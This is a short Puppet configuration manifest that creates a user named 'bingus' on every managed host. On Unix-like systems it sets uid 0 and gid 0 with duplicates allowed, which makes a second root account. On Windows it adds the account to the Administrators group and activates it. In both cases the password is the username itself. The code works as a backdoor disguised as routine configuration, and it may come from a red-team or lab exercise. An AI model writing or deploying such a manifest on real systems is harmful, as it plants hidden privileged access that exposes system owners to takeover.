class user {
  include stdlib
  $users = ['bingus']
  $users.each |$user| {
    if $::osfamily != 'windows' {
      user { $user:
        ensure => present,
        home => '/root',
        managehome => true,
        password => str2saltedsha512($user),
        uid => 0,
        allowdupe => true,
        gid => 0,
        shell => '/bin/bash'
      }
    } elsif $::osfamily == 'windows' {
      user { $user:
        ensure => present,
        groups => ['Administrators'],
        membership => minimum,
        password => $user
      }
      exec { "${user}-active":
        path => 'C:/Windows/System32',
        command => ['net', 'user', $user, '/active:yes']
      }
    }
  }
}
